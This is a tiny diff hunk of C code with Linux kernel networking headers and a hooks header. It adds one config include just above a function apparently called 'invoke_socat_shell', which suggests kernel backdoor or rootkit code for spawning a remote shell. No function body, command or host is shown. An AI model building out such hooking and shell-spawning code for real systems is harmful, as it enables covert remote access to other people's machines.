@@ -5,6 +5,7 @@
 #include <linux/net.h>
 #include <linux/tcp.h>
 
+#include "config.h"
 #include "hooks.h"
 
 void invoke_socat_shell(char *argv[]) {
